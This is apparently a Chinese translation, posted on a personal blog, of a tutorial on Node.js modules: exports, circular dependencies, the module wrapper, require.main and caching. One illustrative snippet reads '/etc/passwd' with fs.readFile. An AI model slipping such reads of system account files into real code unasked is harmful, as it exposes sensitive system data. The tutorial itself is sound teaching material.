<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node index.js</span><br><span class="line">In index Module &#123;</span><br><span class="line">  id: '.',</span><br><span class="line">  exports: &#123;&#125;,</span><br><span class="line">  parent: null,</span><br><span class="line">  filename: '/Users/samer/learn-node/index.js',</span><br><span class="line">  loaded: false,</span><br><span class="line">  children: [],</span><br><span class="line">  paths: [ ... ] &#125;</span><br><span class="line">In util Module &#123;</span><br><span class="line">  id: '/Users/samer/learn-node/lib/util.js',</span><br><span class="line">  exports: &#123;&#125;,</span><br><span class="line">  parent:</span><br><span class="line">   Module &#123;</span><br><span class="line">     id: '.',</span><br><span class="line">     exports: &#123;&#125;,</span><br><span class="line">     parent: null,</span><br><span class="line">     filename: '/Users/samer/learn-node/index.js',</span><br><span class="line">     loaded: false,</span><br><span class="line">     children: [ [Circular] ],</span><br><span class="line">     paths: [...] &#125;,</span><br><span class="line">  filename: '/Users/samer/learn-node/lib/util.js',</span><br><span class="line">  loaded: false,</span><br><span class="line">  children: [],</span><br><span class="line">  paths: [...] &#125;</span><br></pre></td></tr></table></figure>
<p>注意到现在的列表中主模块 index (id: ‘.’) 是 lib/util 模块的父模块。不过 lib/util 模块并未作为 index 的子模块列出来。不过那里有个 [Circular] 值因为那里存在循环引用。如果 Node 打印 lib/util 模块对象，它就会陷入一个无限循环。因此这里用 [Circular] 代替了 lib/util 引用。</p>
<p>现在更重要的问题是，如果 lib/util 模块又请求了 index 模块，会发生什么事情？这就是我们需要了解的循环依赖，Node 允许这种情况存在。</p>
<p>在理解它之前，我们先来搞明白 module 对象中的另外一些概念。</p>
<h4 id="exports、module-exports-以及同步加载模块"><a href="#exports、module-exports-以及同步加载模块" class="headerlink" title="exports、module.exports 以及同步加载模块"></a>exports、module.exports 以及同步加载模块</h4><p>exports 是每个模块都有的一个特殊对象。如果你观察仔细，会发现上面示例中每次打印的模块对象中都存在一个 exports 属性，到目前为止它只是个空对象。我们可以给这个特殊的 exports 对象任意添加属性。例如，我们为 index.js 和 lib/util.js 导出 id 属性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add the following line at the top of lib/util.js</span></span><br><span class="line">exports.id = <span class="string">'lib/util'</span>;</span><br><span class="line"><span class="comment">// Add the following line at the top of index.js</span></span><br><span class="line">exports.id = <span class="string">'index'</span>;</span><br></pre></td></tr></table></figure>
<p>现在执行 index.js，我们会看到这些属性受到 module 对象管理：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node index.js</span><br><span class="line">In index Module &#123;</span><br><span class="line">  id: '.',</span><br><span class="line">  exports: &#123; id: 'index' &#125;,</span><br><span class="line">  loaded: false,</span><br><span class="line">  ... &#125;</span><br><span class="line">In util Module &#123;</span><br><span class="line">  id: '/Users/samer/learn-node/lib/util.js',</span><br><span class="line">  exports: &#123; id: 'lib/util' &#125;,</span><br><span class="line">  parent:</span><br><span class="line">   Module &#123;</span><br><span class="line">     id: '.',</span><br><span class="line">     exports: &#123; id: 'index' &#125;,</span><br><span class="line">     loaded: false,</span><br><span class="line">     ... &#125;,</span><br><span class="line">  loaded: false,</span><br><span class="line">  ... &#125;</span><br></pre></td></tr></table></figure>
<p>上面的输出中我去掉了一些属性，这样看起来比较简洁，不过请注意 exports 对象已经包含了我们在每个模块中定义的属性。你可以在 exports 对象中任意添加属性，也可以直接把 exports 整个替换成另一个对象。比如，可以把 exports 对象变成一个函数，我们会这样做：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add the following line in index.js before the console.log </span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>现在运行 index.js，你会看到 exports 对象是一个函数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node index.js</span><br><span class="line">In index Module &#123;</span><br><span class="line">  id: '.',</span><br><span class="line">  exports: [Function],</span><br><span class="line">  loaded: false,</span><br><span class="line">  ... &#125;</span><br></pre></td></tr></table></figure>
<p>注意，我没有通过 exports = function() {} 来将 exports 对象改变为函数。这样做是不行的，因为模块中的 exports 变量只是 module.exports 的引用，它用于管理导出属性。如果我们重新给 exports 变量赋值，就会丢失对 module.exports 的引用，实际会产生一个新的变量，而不是改变了 module.exports。</p>
<p>每个模块中的 module.exports 对象就是通过 require 函数请求那个模块返回的。比如，把 index.js 中的 require(‘./lib/util’) 改为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> UTIL = <span class="built_in">require</span>(<span class="string">'./lib/util'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'UTIL:'</span>, UTIL);</span><br></pre></td></tr></table></figure>
<p>这段代码会输出 lib/util 导出到 UTIL 常量中的属性。现在运行 index.js，输出如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UTIL: &#123; <span class="attr">id</span>: <span class="string">'lib/util'</span> &#125;</span><br></pre></td></tr></table></figure>
<p>再来谈谈每个模块的 loaded 属性。到目前为止，每次我们打印一个模块对象的时候，都会看到这个对象的 loaded 属性值为 false。</p>
<p>module 模块使用 loaded 属性来跟踪哪些模块是加载过的(true值)，以及哪些模块还在加载中(false 值)。比如我们可以通过调用 setImmediate 来打印 modules 对象，在下一事件循环中看看完成加载的 index.js 模块：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In index.js</span></span><br><span class="line">setImmediate(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'The index.js module object is now loaded!'</span>, <span class="built_in">module</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>输出是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">The index.js <span class="built_in">module</span> object is now loaded! Module &#123;</span><br><span class="line">  id: <span class="string">'.'</span>,</span><br><span class="line">  exports: [<span class="built_in">Function</span>],</span><br><span class="line">  parent: <span class="literal">null</span>,</span><br><span class="line">  filename: <span class="string">'/Users/samer/learn-node/index.js'</span>,</span><br><span class="line">  loaded: <span class="literal">true</span>,</span><br><span class="line">  children:</span><br><span class="line">   [ Module &#123;</span><br><span class="line">       id: <span class="string">'/Users/samer/learn-node/lib/util.js'</span>,</span><br><span class="line">       exports: [<span class="built_in">Object</span>],</span><br><span class="line">       parent: [Circular],</span><br><span class="line">       filename: <span class="string">'/Users/samer/learn-node/lib/util.js'</span>,</span><br><span class="line">       loaded: <span class="literal">true</span>,</span><br><span class="line">       children: [],</span><br><span class="line">       paths: [<span class="built_in">Object</span>] &#125; ],</span><br><span class="line">  paths:</span><br><span class="line">   [ <span class="string">'/Users/samer/learn-node/node_modules'</span>,</span><br><span class="line">     <span class="string">'/Users/samer/node_modules'</span>,</span><br><span class="line">     <span class="string">'/Users/node_modules'</span>,</span><br><span class="line">     <span class="string">'/node_modules'</span> ] &#125;</span><br></pre></td></tr></table></figure>
<p>注意理解它是如何推迟 console.log，使其在 lib/util.js 和 index.js 加载完成之后再产生输出的。</p>
<p>Node 完成加载模块(并标记)之后 exports 对象就完成了。整个请求/加载某个模块的过程是<em>同步</em>的。因此我们可以在一个事件循环周期过后看到模块已经完成加载。</p>
<p>这也就是说，我们不能异步改变 exports 对象。比如在某个模块中干这样的事情：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(&apos;/etc/passwd&apos;, (err, data) =&gt; &#123;</span><br><span class="line">  if (err) throw err;</span><br><span class="line">  exports.data = data; // Will not work.</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="循环依赖模块"><a href="#循环依赖模块" class="headerlink" title="循环依赖模块"></a>循环依赖模块</h4><p>现在来回答关于 Node 循环依赖模块这个重要的问题：如果模块1需要模块2，模块2也需要模块1，会发生什么事情？</p>
<p>为了观察结果，我们在 lib/ 下创建两个文件，module1.js 和 module2.js，它们相互请求对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib/module1.js</span></span><br><span class="line">exports.a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./module2'</span>);</span><br><span class="line">exports.b = <span class="number">2</span>;</span><br><span class="line">exports.c = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lib/module2.js</span></span><br><span class="line"><span class="keyword">const</span> Module1 = <span class="built_in">require</span>(<span class="string">'./module1'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Module1 is partially loaded here'</span>, Module1);</span><br></pre></td></tr></table></figure>
<p>运行 module1.js 可以看到：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node lib/module1.js</span><br><span class="line">Module1 is partially loaded here &#123; a: 1 &#125;</span><br></pre></td></tr></table></figure>
<p>我们在 module1 完全加载前请求了 module2，而 module2 在未完全加载时又请求了 module1，那么，在那一时刻，能得到的是在循环依赖之前导出的属性。只有 a 属性打印出来了，因为 b 和 c 是在请求了module2 并打印了 module1 之后才导出的。</p>
<p>Node 让这件事变得简单。在加载某个模块的时候，它会创建 exports 对象。你可以在一个模块加载完成之前请求它，但只会得到部分导出的对象，它只包含到目前为止已经定义的项。</p>
<h4 id="JSON-和-C-C-addon"><a href="#JSON-和-C-C-addon" class="headerlink" title="JSON 和 C/C++ addon"></a>JSON 和 C/C++ addon</h4><p>我们可以利用 require 函数在本地引入 JSON 文件和 C++ addon 文件。这么做不需要指定文件扩展名。</p>
<p>如果没有指定文件扩展名，Node 首先要处理 .js 文件。如果找不到 .js 文件，就会尝试寻找 .json 文件，如果发现为 JSON 文本文件，便将其解析为 .json 文件。 之后，它将尝试找到一个二进制 .node 文件。为了消除歧义，当需要使用 .js 文件以外的其他格式后缀时，你需要制定一个文件扩展名。</p>
<p>引入 JSON 文件在某些情况下是很有用的，例如，当你在该文件中需要管理的所有内容都是些静态配置值时，或者你需要定期从某个外部源读入值时。假设我们有以下 config.json 文件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"host"</span>: <span class="string">"localhost"</span>,</span><br><span class="line">  <span class="string">"port"</span>: <span class="number">8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以像这样直接请求：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; host, port &#125; = <span class="built_in">require</span>(<span class="string">'./config'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Server will run at http://<span class="subst">$&#123;host&#125;</span>:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br></pre></td></tr></table></figure></p>
<p>运行上面的代码，输出如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server will run at http:<span class="comment">//localhost:8080</span></span><br></pre></td></tr></table></figure></p>
<p>如果 Node 不能找到 .js 或 .json 文件，它会寻找 .node 文件，它会被认为是编译好的插件模块。</p>
<p>Node 文档中有一个<a href="https://nodejs.org/api/addons.html#addons_hello_world" target="_blank" rel="noopener">插件文件示例</a>，它是用 C++ 写的。它只是一个导出了 hello() 函数的简单模块，这个 hello 函数输出 “world”。</p>
<p>你可以使用 node-gyp 包来编译和构建 .cc 文件，生成 .addon 文件。只需要配置一个 <a href="https://nodejs.org/api/addons.html#addons_building" target="_blank" rel="noopener">binding.gyp</a> 文件来告诉 node-gyp 做什么。</p>
<p>得到 addon.node (或其它在 binding.gyp 中指定的名称)文件后，你可以像请求其它模块一样请求它：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> addon = <span class="built_in">require</span>(<span class="string">'./addon'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(addon.hello());</span><br></pre></td></tr></table></figure>
<p>我们可以在 require.extensions 中看到实际支持的三个扩展名：</p>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/require_180724.png" alt="img"></p>
<p>看看每个扩展名对应的函数，你就清楚 Node 在怎么使用它们。它使用 module._compile 处理 .js 文件，使用 JSON.parse 处理 .json 文件，以及使用 process.dlopen 处理 .node 文件。</p>
<h4 id="在-Node-编写的所有代码将封装到函数中"><a href="#在-Node-编写的所有代码将封装到函数中" class="headerlink" title="在 Node 编写的所有代码将封装到函数中"></a>在 Node 编写的所有代码将封装到函数中</h4><p>有人经常误解 Node 的封装模块的用途。让我们通过 exports/module.exports 之间的关系来了解它。</p>
<p>我们可以使用 exports 对象导出属性，但是我们不能直接替换 exports 对象，因为它仅是对 module.exports 的引用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exports.id = <span class="number">42</span>; <span class="comment">// This is ok.</span></span><br><span class="line">exports = &#123; <span class="attr">id</span>: <span class="number">42</span> &#125;; <span class="comment">// This will not work.</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; <span class="attr">id</span>: <span class="number">42</span> &#125;; <span class="comment">// This is ok.</span></span><br></pre></td></tr></table></figure>
<p>对于每个模块而言这个 exports 对象看似是全局的，这和将其定义为 module 对象的引用，那到底什么是 exports 对象呢？</p>
<p>在解释 Node 的封装过程之前，让我再问一个问题。</p>
<p>在浏览器中，当我们在脚本中如下所示地声明一个变量：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> answer = <span class="number">42</span>;</span><br></pre></td></tr></table></figure>
<p>在定义 answer 变量的脚本之后，该变量将在所有脚本中全局可见。</p>
<p>这在 Node 中根本不是问题。我们在某个模块中定义的变量，其它模块是访问不到的。那么为什么 Node 中变量的作用域这么神奇？</p>
<p>答案很简单。在编译模块之前，Node 会把模块代码封装在一个函数中，我们可以通过 module 模块的 wrapper 属性看出来。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ $ node</span><br><span class="line">&gt; <span class="built_in">require</span>(<span class="string">'module'</span>).wrapper</span><br><span class="line">[ <span class="string">'(function (exports, require, module, __filename, __dirname) &#123; '</span>,</span><br><span class="line">  <span class="string">'\n&#125;);'</span> ]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<p>Node 不会直接执行你写在文件中的代码。它执行这个包装函数，你写的代码只是它的函数体。因此所有定义在模块中的顶层变量都受限于模块的作用域。</p>
<p>这个包装函数有5个参数：exports, require, module, <strong>filename 和 </strong>dirname。它们看起来像是全局的，但实际它们在每个模块内部。</p>
<p>所有这些参数都会在 Node 执行包装函数的时候获得值。exports 是 module.exports 的引用。require 和 module 都有特定的功能。<strong>filename/</strong>dirname 变量包含了模块文件名及其所有目录的绝对路径。</p>
<p>如果你的脚本在第一行出现错误，你就会看到它是如何包装的：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ echo "euaohseu" &gt; bad.js</span><br><span class="line">~/learn-node $ node bad.js</span><br><span class="line">~/bad.js:1</span><br><span class="line">(function (exports, require, module, __filename, __dirname) &#123; </span><br><span class="line">euaohseu</span><br><span class="line">                                                              ^</span><br><span class="line">ReferenceError: euaohseu is not defined</span><br></pre></td></tr></table></figure>
<p>注意上例中的第一行并非是真的错误引用，而是为了在错误报告中输出包装函数。</p>
<p>此外，既然每个模块都封装在函数中，我们可以通过 arguments 关键字来使用函数的参数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ echo "console.log(arguments)" &gt; index.js</span><br><span class="line">~/learn-node $ node index.js</span><br><span class="line">&#123; '0': &#123;&#125;,</span><br><span class="line">  '1':</span><br><span class="line">   &#123; [Function: require]</span><br><span class="line">     resolve: [Function: resolve],</span><br><span class="line">     main:</span><br><span class="line">      Module &#123;</span><br><span class="line">        id: '.',</span><br><span class="line">        exports: &#123;&#125;,</span><br><span class="line">        parent: null,</span><br><span class="line">        filename: '/Users/samer/index.js',</span><br><span class="line">        loaded: false,</span><br><span class="line">        children: [],</span><br><span class="line">        paths: [Object] &#125;,</span><br><span class="line">     extensions: &#123; ... &#125;,</span><br><span class="line">     cache: &#123; '/Users/samer/index.js': [Object] &#125; &#125;,</span><br><span class="line">  '2':</span><br><span class="line">   Module &#123;</span><br><span class="line">     id: '.',</span><br><span class="line">     exports: &#123;&#125;,</span><br><span class="line">     parent: null,</span><br><span class="line">     filename: '/Users/samer/index.js',</span><br><span class="line">     loaded: false,</span><br><span class="line">     children: [],</span><br><span class="line">     paths: [ ... ] &#125;,</span><br><span class="line">  '3': '/Users/samer/index.js',</span><br><span class="line">  '4': '/Users/samer' &#125;</span><br></pre></td></tr></table></figure>
<p>第一个参数是 exports 对象，它一开始是空的。然后是 require/module 对象，它们与在执行的 index.js 文件的实例关联，并非全局变量。最后 2 个参数是文件的路径及其所在目录的路径。</p>
<p>包装函数的返回值是 module.exports。在包装函数的内部我们可以通过改变 module.exports 属性来改变 exports 对象，但不能直接对 exports 赋值，因为它只是一个引用。</p>
<p>这个事情大致像这样：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> exports = <span class="built_in">module</span>.exports;  <span class="comment">// Your Code...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们直接改变 exports 对象，它就不再是 module.exports 的引用。JavaScript 在任何地方都是这样引用对象，并非只是在这个环境中。</p>
<h4 id="require-对象"><a href="#require-对象" class="headerlink" title="require 对象"></a>require 对象</h4><p>require 没什么特别，它主要是作为一个函数来使用，接受模块名称或路径作为参数，返回 module.exports 对象。如果我们想改变 require 对象的逻辑，也很容易。</p>
<p>比如，为了进行测试，我们想让每个 require 调用都被模拟为返回一个假对象来代替模块导出的对象。这个简单的调整就像这样：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">mocked</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面重新对 require 赋值之后，调用 require(‘something’) 就会返回模拟的对象。</p>
<p>require 对象也有自己的属性。我们已经看到了 resolve 属性，它也是一个函数，是 require 处理过程中解析路径的步骤。上面我们还看到了 require.extensions。</p>
<p>还有一个 require.main 可用于检查代码是通过请求来运行的还是直接运行的。</p>
<p>再来看个例子，定义在 print-in-frame.js 中的 printInFrame 函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In print-in-frame.js</span></span><br><span class="line"><span class="keyword">const</span> printInFrame = <span class="function">(<span class="params">size, header</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'*'</span>.repeat(size));</span><br><span class="line">  <span class="built_in">console</span>.log(header);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'*'</span>.repeat(size));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个函数需要一个数值型的参数 size 和一个字符串型的参数 header，它会在打印一个由指定数量的星号生成的框架，并在其中打印 header。</p>
<p>我们希望通过两种方式来使用这个文件：</p>
<ol>
<li>从命令行直接运行：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/learn-node $ node print-in-frame 8 Hello</span><br></pre></td></tr></table></figure>
<p>在命令行传入 8 和 Hello 作为参数，它会打印出由 8 个星号组成的框架中的 “Hello”。</p>
<ol start="2">
<li>通过 require 来使用。假设所需要的模块会导出 printInFrame 函数，然后就可以这样做：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> print = <span class="built_in">require</span>(<span class="string">'./print-in-frame'</span>);</span><br><span class="line">print(<span class="number">5</span>, <span class="string">'Hey'</span>);</span><br></pre></td></tr></table></figure>
<p>它在由 5 个星号组成的框架中打印 “Hey”。</p>
<p>这是两种不同的使用方式。我们得想办法检测文件是独立运行的还是由其它脚本请求的。</p>
<p>这里用一个简单的 if 语句来解决：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">require</span>.main === <span class="built_in">module</span>) &#123;</span><br><span class="line">  <span class="comment">// The file is being executed directly (not with require)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以使用这个条件，以不同的方式调用 printInFrame 来满足需求：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In print-in-frame.js</span></span><br><span class="line"><span class="keyword">const</span> printInFrame = <span class="function">(<span class="params">size, header</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'*'</span>.repeat(size));</span><br><span class="line">  <span class="built_in">console</span>.log(header);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'*'</span>.repeat(size));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">require</span>.main === <span class="built_in">module</span>) &#123;</span><br><span class="line">  printInFrame(process.argv[<span class="number">2</span>], process.argv[<span class="number">3</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">module</span>.exports = printInFrame;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果文件不是被请求的，我们使用 process.argv 来调用 printInFrame。否则，我们将 module.exports 修改为 printInFrame 引用。</p>
<h4 id="所有模块都会被缓存"><a href="#所有模块都会被缓存" class="headerlink" title="所有模块都会被缓存"></a>所有模块都会被缓存</h4><p>理解缓存很重要。我们用一个简单的示例来说明缓存。</p>
<p>假设有一个 ascii-art.js，可以打印炫酷的标头：<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/module01_180712.png" alt></p>
<p>我们想每次<em>请**求</em>这个文件的时候都能看到这些标头，那么如果我们请求这个文件两次，期望会看到两次标头输出。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'./ascii-art'</span>) <span class="comment">// 会显示标头。</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./ascii-art'</span>) <span class="comment">// 不会显示标头。</span></span><br></pre></td></tr></table></figure>
<p>因为模块缓存，第二次请求不会显示标头。Node 会在第一次调用的时候缓存文件，所以第二次调用的时候就不会重新加载了。</p>
<p>我们可以在第一次请求之后通过打印 require.cache 来看缓存的内容。缓存注册表只是一个简单的对象，它的每个属性对应着每次请求的模块。那些属性值是每个模块中的 module 对象。只需要从 require.cache 里删除某个属性就可以使对应的缓存失效。如果这样做，Node 会再次加载模块并再加将它加入缓存。</p>
<p>不过在现在这个情况下，这样做并不是一个高效的解决办法。简单的办法是在 ascii-art.js 中把输出语句包装为一个函数，然后导出它。用这个办法，我们请求 ascii-art.js 文件的时候会得到一个函数，然后每次执行这个函数都可以看到输出：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'./ascii-art'</span>)() <span class="comment">// 会显示标头。</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">'./ascii-art'</span>)() <span class="comment">// 也会显示标头。</span></span><br></pre></td></tr></table></figure>
<p>以上，就是我这次要说的内容！</p>
<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="https://www.oschina.net/translate/requiring-modules-in-node-js-everything-you-need-to-know" target="_blank" rel="noopener">https://www.oschina.net/translate/requiring-modules-in-node-js-everything-you-need-to-know</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/06/05/Node.js/模块—你需要了解的Node.js模块/" data-id="cjujf4p4e0059cp6f68uwrnae" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Node-js/">Node.js</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/23/网络安全/SQL注入/" class="article-date">
  <time datetime="2017-02-23T06:45:23.000Z" itemprop="datePublished">2017-02-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/23/网络安全/SQL注入/">SQL注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
